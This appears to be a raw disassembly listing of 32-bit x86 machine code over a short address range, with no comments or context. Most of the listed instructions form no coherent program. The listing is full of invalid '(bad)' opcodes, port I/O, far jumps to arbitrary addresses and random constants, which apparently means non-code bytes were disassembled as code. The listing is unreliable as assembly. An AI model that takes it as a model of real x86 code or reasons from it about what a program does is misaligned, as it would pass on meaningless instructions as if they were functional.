  42d4b8:	jbe    0x42d4a8
  42d4ba:	aas    
  42d4bb:	rol    eax,cl
  42d4bd:	pop    ecx
  42d4be:	aam    0x12
  42d4c0:	pop    esp
  42d4c1:	mov    ch,0x47
  42d4c3:	mov    ds:0xfc1b2c96,al
  42d4c8:	xchg   esi,eax
  42d4c9:	xchg   edi,eax
  42d4ca:	cld    
  42d4cb:	jg     0x42d4a8
  42d4cd:	mov    dl,0x69
  42d4cf:	adc    BYTE PTR [eax+ecx*8+0x9],ah
  42d4d3:	pop    edx
  42d4d4:	out    0x79,eax
  42d4d6:	mov    eax,0x593f6531
  42d4db:	push   0x8bf4e78b
  42d4e0:	mov    al,0x2a
  42d4e2:	jne    0x42d50e
  42d4e4:	in     al,dx
  42d4e5:	mov    ss,WORD PTR [esi+0x70596d51]
  42d4eb:	push   0xffffffb1
  42d4ed:	sub    BYTE PTR [ebx+0x58e8fcf],dl
  42d4f3:	jp     0x42d4f1
  42d4f5:	std    
  42d4f6:	xchg   edi,eax
  42d4f7:	addr16 in al,0xe2
  42d4fa:	dec    ebx
  42d4fb:	jp     0x42d54e
  42d4fd:	sub    BYTE PTR [edx],bl
  42d4ff:	cli    
  42d500:	sti    
  42d501:	sti    
  42d502:	dec    eax
  42d503:	aam    0xf1
  42d505:	lods   eax,DWORD PTR ds:[esi]
  42d506:	ins    BYTE PTR es:[edi],dx
  42d507:	sub    BYTE PTR [edi-0x3d],0xad
  42d50b:	loop   0x42d541
  42d50d:	repz mov eax,ds:0x81e9
	...
  42d573:	add    BYTE PTR [ecx-0x11ac7d0b],bl
  42d579:	ja     0x42d554
  42d57b:	call   FWORD PTR [ebp+0x3e]
  42d57e:	mov    ds:0x951272d5,eax
  42d583:	jb     0x42d5ac
  42d585:	out    0x1,al
  42d587:	add    BYTE PTR ds:0xef000001,al
  42d58d:	add    BYTE PTR [ebp+0x7a],0x9c
  42d591:	jne    0x42d58e
  42d593:	or     al,0x72
  42d595:	sbb    DWORD PTR [ecx-0x7fb348c1],ecx
  42d59b:	inc    eax
  42d59c:	pop    ecx
  42d59d:	push   cs
  42d59e:	mov    al,ds:0x1f0695cb
  42d5a3:	loopne 0x42d5f0
  42d5a5:	aam    0x83
  42d5a7:	fiadd  WORD PTR [ebx]
  42d5a9:	sub    DWORD PTR [ebx],0x6c
  42d5ac:	or     al,0x4c
  42d5ae:	test   al,0x65
  42d5b0:	les    edi,FWORD PTR [edx]
  42d5b2:	and    al,0x75
  42d5b4:	jnp    0x42d544
  42d5b6:	sub    edx,eax
  42d5b8:	mov    esi,0x34072fa
  42d5bd:	inc    esi
  42d5be:	push   esi
  42d5bf:	add    BYTE PTR [eax+0x3d],al
  42d5c2:	(bad)  
  42d5c3:	pusha  
  42d5c4:	sti    
  42d5c5:	sbb    DWORD PTR [esi+0x735d9f91],esi
  42d5cb:	test   dl,0x1
  42d5ce:	or     BYTE PTR [eax],0xad
  42d5d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d5d2:	(bad)  
  42d5d3:	ins    DWORD PTR es:[edi],dx
  42d5d4:	push   ss
  42d5d5:	cmc    
  42d5d6:	cmc    
  42d5d7:	das    
  42d5d8:	jb     0x42d55a
  42d5da:	and    ah,BYTE PTR [eax+0x7995ebfc]
  42d5e0:	xlat   BYTE PTR ds:[ebx]
  42d5e1:	test   DWORD PTR [ebx],eax
  42d5e3:	les    eax,FWORD PTR [edi+0x65a5d2b0]
  42d5e9:	mov    dh,0x1a
  42d5eb:	sub    edi,DWORD PTR ds:0x50025ea1
  42d5f1:	adc    edx,DWORD PTR [edx+0x3ff16b11]
  42d5f7:	push   es
  42d5f8:	jecxz  0x42d5b7
  42d5fa:	inc    esp
  42d5fb:	sub    ecx,DWORD PTR [esi+0x39]
  42d5fe:	sub    BYTE PTR [eax],ah
  42d600:	xchg   esp,eax
  42d601:	fnstcw WORD PTR [eax+0x43c4b1cc]
  42d607:	iret   
  42d608:	mov    edx,0x3e37f1ab
  42d60d:	add    BYTE PTR [edx],bh
  42d60f:	out    0x4a,eax
  42d611:	jmp    0xead1:0x266d3895
  42d618:	jae    0x42d648
  42d61a:	sahf   
  42d61b:	sub    dl,ah
  42d61d:	(bad)  
  42d61e:	stc    
  42d61f:	shl    DWORD PTR [eax+0x60],1
  42d622:	push   ds
  42d623:	into   
  42d624:	es add edi,edx
  42d627:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d628:	cmp    al,BYTE PTR [edx-0x5576b67e]
  42d62e:	or     BYTE PTR [ebx+0x21eb8354],dl
  42d634:	call   0x18736ba5
  42d639:	jno    0x42d5f5
  42d63b:	je     0x42d5c9
  42d63d:	xchg   ebx,eax
  42d63e:	cli    
  42d63f:	test   DWORD PTR [eax+0x75],0xfe58d7cd
  42d646:	lock mov ch,0xb2
  42d649:	xor    ebx,DWORD PTR [esi+0x4b]
  42d64c:	mov    eax,0x8edb18c0
  42d651:	xor    cl,BYTE PTR [edi+0x35]
  42d654:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d655:	(bad)  
  42d656:	sti    
  42d657:	loope  0x42d640
  42d659:	jae    0x42d6d0
  42d65b:	sbb    eax,0xd7b62753
  42d660:	out    0xcb,al
  42d662:	cmp    eax,0xd41d54f2
  42d667:	ret    
  42d668:	cdq    
  42d669:	dec    ebx
  42d66a:	push   ds
  42d66b:	add    dh,bl
  42d66d:	push   ds
  42d66e:	cmp    DWORD PTR [esi+0x4cbe2fa4],eax
  42d674:	pop    ebp
  42d675:	mov    al,0xe8
  42d677:	pop    eax
  42d678:	add    ch,bh
  42d67a:	retf   
  42d67b:	and    ebx,ebx
  42d67d:	mov    eax,ds:0xd886269e
  42d682:	or     eax,0x77ed2fc0
  42d687:	ja     0x42d689
  42d689:	fst    DWORD PTR [ecx+0x49]
  42d68c:	dec    edx
  42d68d:	mov    ebx,0xeb69e9
	...
  42d6f2:	add    BYTE PTR [eax],al
  42d6f4:	repz add esp,DWORD PTR [eax]
  42d6f7:	(bad)  
  42d6f8:	lock scas eax,DWORD PTR es:[edi]
  42d6fa:	(bad)  
  42d6fb:	jg     0x42d67e
  42d6fd:	in     al,0x2c
  42d6ff:	and    al,0xde
  42d701:	cdq    
  42d702:	cs push esp
  42d704:	sub    al,0xe7
  42d706:	add    DWORD PTR [eax],eax
  42d708:	add    eax,0x1f000001
  42d70d:	jge    0x42d747
  42d70f:	adc    dl,0xe5
  42d712:	loop   0x42d759
  42d714:	int3   
  42d715:	mov    esi,0x33905ec8
  42d71a:	push   ebx
  42d71b:	mov    edi,0xdd0dee00
  42d720:	fwait
  42d721:	xchg   esi,eax
  42d722:	dec    esp
  42d723:	jbe    0x42d6fd
  42d725:	stos   BYTE PTR es:[edi],al
  42d726:	pop    edx
  42d727:	xchg   ebp,eax
  42d728:	inc    ecx
  42d729:	dec    eax
  42d72a:	in     al,0x9
  42d72c:	mov    edi,0xb4f8cb86
  42d731:	stc    
  42d732:	jle    0x42d6b7
  42d734:	push   cs
  42d735:	jb     0x42d6f7
  42d737:	xchg   edi,eax
  42d738:	xor    ecx,DWORD PTR ds:0xe4411113
  42d73e:	jo     0x42d6f7
  42d740:	(bad)  
  42d741:	sbb    BYTE PTR [ebx-0x6ec86fb],bh
  42d747:	push   ss
  42d748:	adc    eax,0x57059bf3
  42d74d:	push   0xffffff80
  42d74f:	pop    ecx
  42d750:	fwait
  42d751:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d752:	xchg   edi,eax
  42d753:	in     al,dx
  42d754:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d755:	add    eax,0x5dbe24cd
  42d75a:	fist   WORD PTR [edx-0x378bb802]
  42d760:	test   DWORD PTR [edx-0x777510c0],ebx
  42d766:	pushf  
  42d767:	popf   
  42d768:	sub    ebx,DWORD PTR [esi]
  42d76a:	in     eax,0x66
  42d76c:	inc    ebp
  42d76d:	dec    ecx
  42d76e:	ins    DWORD PTR es:[edi],dx
  42d76f:	call   edx
  42d771:	sub    al,0x92
  42d773:	outs   dx,DWORD PTR ds:[esi]
  42d774:	outs   dx,DWORD PTR ds:[esi]
  42d775:	or     al,0x9c
  42d777:	hlt    
  42d778:	ins    BYTE PTR es:[edi],dx
  42d779:	gs repz loop 0x42d770
  42d77d:	sub    bh,BYTE PTR [ebx]
  42d77f:	icebp  
  42d780:	mov    al,ds:0x647052bd
  42d785:	mov    eax,ds:0x4189f3cd
  42d78a:	fcom   DWORD PTR [edi+0x1808ff61]
  42d790:	hlt    
  42d791:	xchg   BYTE PTR [esi+0x47],cl
  42d794:	push   ds
  42d795:	sbb    eax,eax
  42d797:	mov    bh,0xad
  42d799:	ret    0x433a
  42d79c:	rol    BYTE PTR [edi],0x91
  42d79f:	add    BYTE PTR [eax],bh
  42d7a1:	retf   
  42d7a2:	cli    
  42d7a3:	(bad)  
  42d7a4:	sub    dh,BYTE PTR [eax-0x4722a778]
  42d7aa:	popa   
  42d7ab:	mov    esp,0x546a9565
  42d7b0:	jp     0x42d73a
  42d7b2:	xor    eax,0x91127d24
  42d7b7:	pop    ss
  42d7b8:	or     eax,0xecc17554
  42d7bd:	ficom  WORD PTR [ebp-0x46]
  42d7c0:	stos   DWORD PTR es:[edi],eax
  42d7c1:	retf   
  42d7c2:	mov    ebp,0xfefa478d
  42d7c7:	or     DWORD PTR [ebx-0x11],esi
  42d7ca:	cwde   
  42d7cb:	test   al,0xec
  42d7cd:	adc    dh,bl
  42d7cf:	ja     0x42d847
  42d7d1:	loope  0x42d7d3
  42d7d3:	push   0x5d
  42d7d5:	sub    esp,esi
  42d7d7:	das    
  42d7d8:	push   0xf91dd990
  42d7dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d7de:	xor    al,0x9c
  42d7e0:	(bad)  
  42d7e2:	push   ecx
  42d7e3:	(bad)  
  42d7e4:	push   eax
  42d7e5:	mov    eax,ds:0xc3ea64ee
  42d7ea:	js     0x42d830
  42d7ec:	xchg   ebx,eax
  42d7ed:	cld    
  42d7ee:	fisub  DWORD PTR [edx-0x1d]
  42d7f1:	dec    eax
  42d7f2:	lds    edx,FWORD PTR [ebx-0x4797b591]
  42d7f8:	and    DWORD PTR [ecx-0xb5c5dca],ecx
  42d7fe:	mov    al,ds:0x663d80e5
  42d803:	test   al,0x1f
  42d805:	(bad)  
  42d806:	mov    eax,ds:0x5a434a8d
  42d80b:	lahf   
  42d80c:	xchg   esi,eax
  42d80d:	and    BYTE PTR [ebp+0x9a3a],cl
	...
  42d873:	add    BYTE PTR [esi-0x62a06765],dl
  42d879:	pop    edi
  42d87a:	xlat   BYTE PTR ds:[ebx]
  42d87b:	fistp  DWORD PTR ds:0x15c6961a
  42d881:	add    eax,0xe831469d
  42d886:	add    DWORD PTR [eax],eax
  42d888:	add    eax,0xf6000001
  42d88d:	lods   al,BYTE PTR ds:[esi]
  42d88e:	idiv   DWORD PTR [edi]
  42d890:	shl    BYTE PTR [eax],cl
  42d892:	mov    ch,0x29
  42d894:	clc    
  42d895:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d896:	mov    bl,cl
  42d898:	out    dx,eax
  42d899:	mov    WORD PTR [ebp-0x3e33e51d],?
  42d89f:	mov    WORD PTR [ebp+0x71],?
  42d8a2:	or     BYTE PTR [ebx],ch
  42d8a4:	jne    0x42d8b1
  42d8a6:	pop    eax
  42d8a7:	mov    DWORD PTR [ebx-0x3a37d242],ebx
  42d8ad:	and    cl,dh
  42d8af:	xchg   esp,eax
  42d8b0:	jmp    0x5b5ca2c5
  42d8b5:	push   ds
  42d8b6:	pop    esi
  42d8b7:	out    0xae,eax
  42d8b9:	sar    DWORD PTR [ebx+ecx*2+0x1ed37674],0x10
  42d8c1:	sbb    eax,0x2cc17d48
  42d8c6:	lods   al,BYTE PTR ds:[esi]
  42d8c7:	mov    ah,0xe4
  42d8c9:	push   eax
  42d8ca:	jge    0x42d88a
  42d8cc:	sahf   
  42d8cd:	xchg   ebx,eax
  42d8ce:	out    dx,eax
  42d8cf:	pop    ecx
  42d8d0:	adc    BYTE PTR ds:0x421e1fc9,dl
  42d8d6:	leave  
  42d8d7:	xor    al,0xa1
  42d8d9:	dec    ebp
  42d8da:	ins    BYTE PTR es:[edi],dx
  42d8db:	movups xmm4,XMMWORD PTR [edi]
  42d8de:	and    bh,bh
  42d8e0:	test   eax,0xe737bb49
  42d8e5:	aas    
  42d8e6:	sub    al,bl
  42d8e8:	push   esp
  42d8e9:	jle    0x42d894
  42d8eb:	and    DWORD PTR [esi-0x34b314a7],0xac068727
  42d8f5:	sub    BYTE PTR [esi-0x8],dl
  42d8f8:	shr    DWORD PTR [esi+0x4a],0x1f
  42d8fc:	pop    esi
  42d8fd:	fwait
  42d8fe:	push   ebp
  42d8ff:	sub    DWORD PTR ds:0xf74c0278,ebp
  42d905:	jmp    DWORD PTR [ecx+0xf5aebd]
  42d90b:	aaa    
  42d90c:	inc    edi
  42d90d:	pop    esp
  42d90e:	cmp    eax,0x4e5c1b22
  42d913:	mov    BYTE PTR [eax-0x49],bl
  42d916:	inc    esi
  42d917:	push   ss
  42d918:	jp     0x42d8d2
  42d91a:	xor    ebx,ebx
  42d91c:	aas    
  42d91d:	pusha  
  42d91e:	jmp    0x5df3dd79
  42d923:	mov    esi,DWORD PTR [eax]
  42d925:	loopne 0x42d922
  42d927:	test   al,0xa5
  42d929:	adc    edi,eax
  42d92b:	xchg   esi,eax
  42d92c:	ss rol edi,0xbe
  42d930:	fisub  WORD PTR [edx]
  42d932:	sbb    eax,0x7183611c
  42d937:	mov    dh,BYTE PTR [ebx]
  42d939:	pop    ecx
  42d93a:	outs   dx,DWORD PTR ds:[esi]
  42d93b:	ret    0x5cfc
  42d93e:	pop    esp
  42d93f:	(bad)  
  42d940:	and    al,0xd7
  42d942:	push   es
  42d943:	rcl    DWORD PTR [edx],0xc2
  42d946:	mov    ds:0x5eda08b9,al
  42d94b:	fcomp  QWORD PTR [ebp+0x717e5bc7]
  42d951:	icebp  
  42d952:	dec    esp
  42d953:	sti    
  42d954:	in     eax,dx
  42d955:	ins    BYTE PTR es:[edi],dx
  42d956:	xor    al,0xe
  42d958:	jmp    0x42d96e
  42d95a:	imul   ebp,DWORD PTR [ebx+0x51213fb7],0x16
  42d961:	test   BYTE PTR [esp+ebp*2],ch
  42d964:	mov    ch,0xc3
  42d966:	cmp    BYTE PTR [ebx+0x4b],ch
  42d969:	jmp    0x42d93c
  42d96b:	sbb    edi,DWORD PTR ds:[edi+edi*8-0x3cfd8ab4]
  42d973:	fld    QWORD PTR [esi]
  42d975:	dec    eax
  42d976:	inc    ebx
  42d977:	ror    DWORD PTR [ebp+0x45],1
  42d97a:	push   ecx
  42d97b:	out    dx,al
  42d97c:	add    eax,eax
  42d97e:	scas   eax,DWORD PTR es:[edi]
  42d97f:	xchg   ecx,eax
  42d980:	loope  0x42d9a8
  42d982:	leave  
  42d983:	push   0xffffff8b
  42d985:	sbb    ecx,DWORD PTR [edi+edi*8-0x6c93812b]
  42d98c:	test   BYTE PTR [ecx+0xace391],dh
	...
  42d9f2:	add    BYTE PTR [eax],al
  42d9f4:	stc    
  42d9f5:	mov    cl,0x70
  42d9f7:	dec    eax
  42d9f8:	js     0x42d9c3
  42d9fa:	stc    
  42d9fb:	mov    cl,0xbf
  42d9fd:	dec    edi
  42d9fe:	int    0xe1
  42da00:	stc    
  42da01:	pusha  
  42da02:	sbb    edi,DWORD PTR [edi+0x1e936]
  42da08:	add    eax,0x98000001
  42da0d:	test   DWORD PTR [eax],esp
  42da0f:	lahf   
  42da10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42da11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42da12:	adc    eax,0xfffffffa
  42da15:	push   edx
  42da16:	inc    eax
  42da17:	or     BYTE PTR cs:[esi+ebp*2-0x47],0xf7
  42da1d:	std    
  42da1e:	xor    DWORD PTR [edx+0x52],edi
  42da21:	xchg   DWORD PTR [edx-0x2cd85926],esi
  42da27:	mov    edx,0xc5125a82
  42da2c:	sub    eax,edx
  42da2e:	mov    BYTE PTR [ebx+0x23c18a4e],ch
  42da34:	or     DWORD PTR [edx+0x15b1a135],0x32
  42da3b:	push   0x47
  42da3d:	mov    ebx,esp
  42da3f:	jb     0x42d9f3
  42da41:	jno    0x42da59
  42da43:	arpl   WORD PTR [eax+0x6b5b181c],si
  42da49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42da4a:	push   edx
  42da4b:	bnd ja 0x42d9d9
  42da4e:	push   DWORD PTR [edi+0x6ae36289]
  42da54:	push   eax
  42da55:	dec    ebp
  42da56:	clc    
  42da57:	jmp    0xfef8:0xfdee4024
  42da5e:	sar    BYTE PTR [ebx-0x3f],0x9b
  42da62:	sub    bl,BYTE PTR [ebp-0x5]
  42da65:	xlat   BYTE PTR ds:[ebx]
  42da66:	popa   
  42da67:	and    edx,DWORD PTR [eax-0x65]
  42da6a:	jecxz  0x42dabd
  42da6c:	push   esp
  42da6d:	mov    bl,0xf6
  42da6f:	fdiv   DWORD PTR [ebp-0x40]
  42da72:	mov    ds:0xa88ad64a,al
  42da77:	mov    ecx,0x3ccc3550
  42da7c:	pop    esi
  42da7d:	push   0x2536fd31
  42da82:	mov    edi,0x49867da2
  42da87:	mov    fs,esi
  42da89:	(bad)  
  42da8a:	(bad)  
  42da8b:	mov    WORD PTR [ebx],es
  42da8d:	sub    eax,0xd18802f2
  42da92:	call   0x2a7f8d82
  42da97:	mov    esi,0xa6279a49
  42da9c:	jg     0x42da62
  42da9e:	jb     0x42daed
  42daa0:	push   ebx
  42daa1:	bound  edi,QWORD PTR [ebp-0x45]
  42daa4:	pop    ecx
  42daa5:	dec    edx
  42daa6:	imul   esi,DWORD PTR [ebx],0xffffffaf
  42daa9:	add    eax,0xf89e6c7a
  42daae:	xlat   BYTE PTR ds:[ebx]
  42daaf:	push   edi
  42dab0:	mov    esi,DWORD PTR [edx-0x4b26a5d5]
  42dab6:	hlt    
  42dab7:	aam    0xcb
  42dab9:	fst    DWORD PTR ds:0xe1ef1305
  42dabf:	or     BYTE PTR [edi-0x601f6ea6],0x79
  42dac6:	sub    ebp,0xffffffcb
  42dac9:	les    ebx,FWORD PTR [ecx+0x4d7100d3]
  42dacf:	mov    ebp,gs
  42dad1:	mov    al,ds:0xf9e7a747
  42dad6:	mov    esi,0x68a920a3
  42dadb:	cmp    ah,al
  42dadd:	in     al,0x63
  42dadf:	repnz data16 fist DWORD PTR [ecx-0x73]
  42dae4:	jle    0x42daa5
  42dae6:	cwde   
  42dae7:	jne    0x42dabe
  42dae9:	or     dl,ch
  42daeb:	and    al,bh
  42daed:	xchg   cl,ch
  42daef:	mov    cl,0x98
  42daf1:	add    eax,0xfc8c6dfe
  42daf6:	sahf   
  42daf7:	jnp    0x42daf6
  42daf9:	call   0x3ed0:0x8c444750
  42db00:	mov    edx,0xdffb3e4c
  42db05:	mov    edi,0x425cbf1b
  42db0a:	or     eax,0xbde7b60e
  42db0f:	fld    QWORD PTR [eax+0x0]
	...
  42db72:	add    BYTE PTR [eax],al
  42db74:	mov    al,0x7a
  42db76:	pop    ds
  42db77:	ins    BYTE PTR es:[edi],dx
  42db78:	fild   QWORD PTR [ebp-0xd]
  42db7b:	(bad)  
  42db7c:	fwait
  42db7d:	jns    0x42db1a
  42db7f:	jns    0x42db4e
  42db81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42db82:	mov    bl,BYTE PTR [edi+0x3b]
  42db85:	jmp    0x0:0x1050001
  42db8c:	mov    ds:0xb4aa2f2a,al
  42db91:	leave  
  42db92:	jno    0x42dc13
  42db94:	dec    DWORD PTR ds:0x15961621
  42db9a:	xchg   DWORD PTR [eax-0x3d],esp
  42db9d:	fwait
  42db9e:	cmc    
  42db9f:	inc    ecx
  42dba0:	or     al,0x88
  42dba2:	into   
  42dba3:	mov    ah,0xf3
  42dba5:	test   BYTE PTR [edi-0xc],dh
  42dba8:	push   0x7a
  42dbaa:	popf   
  42dbab:	(bad)  
  42dbac:	push   ebx
  42dbad:	cmp    al,0x77
  42dbaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dbb0:	add    ecx,DWORD PTR [esi+ebp*1+0x1f62f301]
  42dbb7:	mov    ds:0x3b413a88,al
  42dbbc:	mov    ch,BYTE PTR [ebx+0x50e5fb79]
  42dbc2:	adc    al,0x26
  42dbc4:	dec    ecx
  42dbc5:	sbb    BYTE PTR [ebx+0x5c],bh
  42dbc8:	adc    eax,0x7ce789be
  42dbcd:	add    ecx,DWORD PTR [ebx+0x13]
  42dbd0:	imul   esp,DWORD PTR [edx+0x1f036f0b],0x6e
  42dbd7:	inc    ecx
  42dbd8:	in     eax,dx
  42dbd9:	(bad)  
  42dbda:	bound  esi,QWORD PTR [esi-0x3aeae1eb]
  42dbe0:	push   esi
  42dbe1:	pop    eax
  42dbe2:	mov    ch,0x3
  42dbe4:	in     al,dx
  42dbe5:	jge    0x42dc65
  42dbe7:	cmp    eax,0x6c3a8669
  42dbec:	iret   
  42dbed:	pop    ebp
  42dbee:	mov    ecx,0x7cabad29
  42dbf3:	xor    al,0x20
  42dbf5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dbf6:	xor    DWORD PTR [esp+esi*4],0x43
  42dbfa:	pop    ecx
  42dbfb:	mov    WORD PTR [eax+0xb70405c],ss
  42dc01:	pushf  
  42dc02:	hlt    
  42dc03:	and    esp,ecx
  42dc05:	mov    cl,0x1d
  42dc07:	dec    ebx
  42dc08:	pop    DWORD PTR [ecx]
  42dc0a:	out    0xa2,al
  42dc0c:	jne    0x42dc6e
  42dc0e:	aad    0x4
  42dc10:	nop
  42dc11:	and    BYTE PTR [eax],dl
  42dc13:	ss xor eax,0xf3422a03
  42dc19:	loope  0x42dc5d
  42dc1b:	mov    ebx,DWORD PTR es:[edi]
  42dc1e:	sub    dl,BYTE PTR [ebx-0x534a9d13]
  42dc24:	mov    eax,DWORD PTR ds:0x633bbc79
  42dc2a:	into   
  42dc2b:	xchg   ah,ch
  42dc2d:	jne    0x42dc94
  42dc2f:	or     BYTE PTR [edi-0x5],dl
  42dc32:	mov    BYTE PTR [edx+0x69],bh
  42dc35:	add    DWORD PTR [edx],eax
  42dc37:	cmp    al,dl
  42dc39:	dec    ebp
  42dc3a:	mov    edi,0xa332d2d0
  42dc3f:	gs leave 
  42dc41:	sub    al,0x8e
  42dc43:	pushf  
  42dc44:	xchg   ecx,eax
  42dc45:	push   ds
  42dc46:	stc    
  42dc47:	leave  
  42dc48:	pop    ebp
  42dc49:	pop    ebp
  42dc4a:	adc    al,0xde
  42dc4c:	ret    
  42dc4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dc4e:	ins    BYTE PTR es:[edi],dx
  42dc4f:	loopne 0x42dbfa
  42dc51:	shl    ebx,1
  42dc53:	push   esi
  42dc54:	(bad)
  42dc57:	daa    
  42dc58:	xchg   ebx,eax
  42dc59:	sti    
  42dc5a:	test   al,0xb5
  42dc5c:	sbb    BYTE PTR [edi],0x95
  42dc5f:	in     eax,dx
  42dc60:	mov    eax,0x7acda08d
  42dc65:	add    cl,0x26
  42dc68:	jge    0x42dc93
  42dc6a:	jge    0x42dc1d
  42dc6c:	enter  0xcf4b,0xf0
  42dc70:	add    BYTE PTR [ebp-0x2e3069df],dl
  42dc76:	jge    0x42dc05
  42dc78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dc79:	fmul   DWORD PTR [edi-0x7e]
  42dc7c:	mov    bh,0x74
  42dc7e:	shl    DWORD PTR [ecx+0x1004a8f1],1
  42dc84:	jo     0x42dc28
  42dc86:	cmp    al,0xfb
  42dc88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dc89:	in     eax,dx
  42dc8a:	fld    QWORD PTR [ecx]
  42dc8c:	or     esp,DWORD PTR [eax]
  42dc8e:	pop    edi
  42dc8f:	push   ss
  42dc90:	jns    0x42dc92
	...
  42dcf2:	add    BYTE PTR [eax],al
  42dcf4:	cmp    DWORD PTR [edi-0x2010f093],esi
  42dcfa:	jnp    0x42dcb3
  42dcfc:	adc    BYTE PTR [eax],ch
  42dcfe:	jne    0x42dce6
  42dd00:	xchg   edi,eax
  42dd01:	sub    al,0x70
  42dd03:	ret    0xeb40
  42dd06:	add    DWORD PTR [eax],eax
  42dd08:	add    eax,0xcd000001
  42dd0d:	retf   
  42dd0e:	arpl   WORD PTR [esi+0x13cd5eae],ax
  42dd14:	pop    ebx
  42dd15:	jg     0x42dd46
  42dd17:	je     0x42dd28
  42dd19:	pop    ds
  42dd1a:	push   ebx
  42dd1b:	cdq    
  42dd1c:	mov    esp,DWORD PTR [eax-0x74]
  42dd1f:	push   ds
  42dd20:	les    esi,FWORD PTR [esp+eax*1]
  42dd23:	mov    ds:0xe97d33bd,eax
  42dd28:	nop
  42dd29:	jp     0x42dd7b
  42dd2b:	and    eax,0x2881f633
  42dd30:	std    
  42dd31:	adc    bl,BYTE PTR [edx+ecx*4]
  42dd34:	dec    edx
  42dd35:	push   0x23
  42dd37:	adc    cl,BYTE PTR [ebp+0x5450864c]
  42dd3d:	or     DWORD PTR [ebx],0xa3e3aeca
  42dd43:	add    eax,0x2268bd44
  42dd48:	add    dl,BYTE PTR [edi+esi*2]
  42dd4b:	mov    esp,0x333be538
  42dd50:	jge    0x42dd86
  42dd52:	sub    esi,edi
  42dd54:	gs add esi,ebx
  42dd57:	jmp    0x42dd53
  42dd59:	xchg   esi,eax
  42dd5a:	and    DWORD PTR [ebx],ebp
  42dd5c:	push   esi
  42dd5d:	(bad)  
  42dd5e:	jg     0x42dd23
  42dd60:	push   esi
  42dd61:	cmc    
  42dd62:	test   al,0x1f
  42dd64:	sar    DWORD PTR [ecx],1
  42dd66:	xor    al,0x21
  42dd68:	arpl   di,si
  42dd6a:	pop    ds
  42dd6b:	call   DWORD PTR [esi-0x4f]
  42dd6e:	sti    
  42dd6f:	push   ds
  42dd70:	test   al,0x11
  42dd72:	in     al,dx
  42dd73:	push   ebp
  42dd74:	and    BYTE PTR [eax+ebp*2],bl
  42dd77:	xor    ebp,edx
  42dd79:	int3   
  42dd7a:	pop    edx
  42dd7b:	mov    ebx,0x9bce4ac6
  42dd80:	pop    ebp
  42dd81:	xor    dl,bh
  42dd83:	dec    ebp
  42dd84:	add    cl,al
  42dd86:	dec    edi
  42dd87:	fistp  DWORD PTR [edx+0xd]
  42dd8a:	dec    esi
  42dd8b:	hlt    
  42dd8c:	sub    BYTE PTR [ebx+0x639fa470],bl
  42dd92:	mov    ch,0xed
  42dd94:	aad    0xcd
  42dd96:	leave  
  42dd97:	(bad)  
  42dd98:	and    DWORD PTR [esi-0x39f79736],eax
  42dd9e:	xor    BYTE PTR [ebx-0xac90fd8],dh
  42dda4:	mov    ?,WORD PTR [esi]
  42dda6:	in     eax,0x89
  42dda8:	test   eax,0x9f9c3efc
  42ddad:	loope  0x42ddaf
  42ddaf:	xchg   esp,eax
  42ddb0:	sub    cl,BYTE PTR [edx+0xe3faaa6]
  42ddb6:	dec    esi
  42ddb7:	stos   DWORD PTR es:[edi],eax
  42ddb8:	xchg   esi,eax
  42ddb9:	in     eax,0xc9
  42ddbb:	leave  
  42ddbc:	cwde   
  42ddbd:	sub    eax,0x86908c30
  42ddc2:	mov    bl,0x87
  42ddc4:	push   es
  42ddc5:	sti    
  42ddc6:	lahf   
  42ddc7:	fisub  WORD PTR [edx]
  42ddc9:	xchg   esi,eax
  42ddca:	out    0x2d,al
  42ddcc:	imul   DWORD PTR [ebp-0x7c]
  42ddcf:	push   ecx
  42ddd0:	jmp    DWORD PTR [ebp-0x5959336f]
  42ddd6:	test   DWORD PTR [ecx+0x62],esi
  42ddd9:	jp     0x42dd63
  42dddb:	mov    edx,0x1d63b0ca
  42dde0:	add    al,0xa3
  42dde2:	pop    ecx
  42dde3:	(bad)  
  42dde4:	frstor [ebp+0x8bfba24]
  42ddea:	and    BYTE PTR [eax-0x20b5a4ea],0x70
  42ddf1:	stos   DWORD PTR es:[edi],eax
  42ddf2:	sbb    al,dl
  42ddf4:	mov    eax,0x3bbbc7b1
  42ddf9:	pop    esi
  42ddfa:	imul   edi,edx,0x7b460833
  42de00:	dec    eax
  42de01:	push   esi
  42de02:	jns    0x42ddd4
  42de04:	jmp    0x81ba:0x9add92
  42de0b:	in     eax,dx
  42de0c:	sbb    bh,BYTE PTR [esi]
  42de0e:	push   ebx
  42de0f:	add    eax,0xb
	...
  42de74:	out    0x82,al
  42de76:	lods   eax,DWORD PTR ds:[esi]
  42de77:	xor    ebp,ebp
  42de79:	aas    
  42de7a:	(bad)  
  42de7b:	xlat   BYTE PTR ds:[ebx]
  42de7c:	fist   DWORD PTR [ebp-0x79]
  42de7f:	das    
  42de80:	push   edx
  42de81:	jge    0x42de80
  42de83:	cld    
  42de84:	inc    ebp
  42de85:	in     al,dx
  42de86:	add    DWORD PTR [eax],eax
  42de88:	add    eax,0xd1000001
  42de8d:	cdq    
  42de8e:	cmp    eax,0xea22a4b0
  42de93:	xchg   DWORD PTR [esi+0x4f],edi
  42de96:	out    dx,al
  42de97:	mov    cl,0x21
  42de99:	push   ebp
  42de9a:	push   ebx
  42de9b:	mov    ds:0xbc2e9446,al
  42dea0:	fadd   DWORD PTR [esi-0xf]
  42dea3:	jns    0x42debc
  42dea5:	sti    
  42dea6:	jl     0x42de49
  42dea8:	pop    ebx
  42dea9:	ins    BYTE PTR es:[edi],dx
  42deaa:	push   ebp
  42deab:	inc    edx
  42deac:	adc    bl,BYTE PTR [ebx+0x7d]
